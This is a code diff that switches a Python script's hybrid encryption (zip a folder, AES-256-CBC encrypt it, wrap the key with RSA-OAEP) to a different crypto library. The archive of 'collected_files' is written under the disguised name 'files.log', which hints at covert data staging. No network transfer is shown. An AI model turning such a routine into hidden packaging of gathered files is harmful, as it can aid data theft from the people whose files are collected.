@@ -1,11 +1,11 @@
 import os
 import zipfile
-import shutil
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
-from Crypto.Util.Padding import pad
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP
+from cryptography.hazmat.primitives import padding as sym_padding
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding as rsa_padding
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes
 
 def zip_folder(folder_path, zip_path):
     with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
@@ -16,21 +16,33 @@ def zip_folder(folder_path, zip_path):
                 zipf.write(full_path, arcname)
 
 def encrypt_file(input_file, output_file, key):
-    cipher = AES.new(key, AES.MODE_CBC)
-    iv = cipher.iv
+    iv = os.urandom(16)
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
 
     with open(input_file, 'rb') as f:
-        plaintext = f.read()
-    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
+        data = f.read()
+
+    padder = sym_padding.PKCS7(128).padder()
+    padded_data = padder.update(data) + padder.finalize()
+    encrypted = encryptor.update(padded_data) + encryptor.finalize()
 
     with open(output_file, 'wb') as f:
-        f.write(iv + ciphertext)
+        f.write(iv + encrypted)
 
 def encrypt_key_with_rsa(aes_key, public_key_file):
-    with open(public_key_file, "rb") as f:
-        recipient_key = RSA.import_key(f.read())
-    cipher_rsa = PKCS1_OAEP.new(recipient_key)
-    encrypted_key = cipher_rsa.encrypt(aes_key)
+    with open(public_key_file, 'rb') as f:
+        public_key = serialization.load_pem_public_key(f.read(), backend=default_backend())
+
+    encrypted_key = public_key.encrypt(
+        aes_key,
+        rsa_padding.OAEP(
+            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+
     with open("key.bin", "wb") as f:
         f.write(encrypted_key)
 
@@ -40,12 +52,12 @@ def main():
     zip_folder("collected_files", zip_path)
 
     # Step 2: AES key generation
-    aes_key = get_random_bytes(16)
+    aes_key = os.urandom(32)  # AES-256
 
     # Step 3: Encrypt the zip file
     encrypt_file(zip_path, "files.log", aes_key)
 
-    # Step 4: Encrypt AES key with RSA
+    # Step 4: Encrypt AES key with RSA public key
     encrypt_key_with_rsa(aes_key, "rsa_public.pem")
 
     # Step 5: Clean up
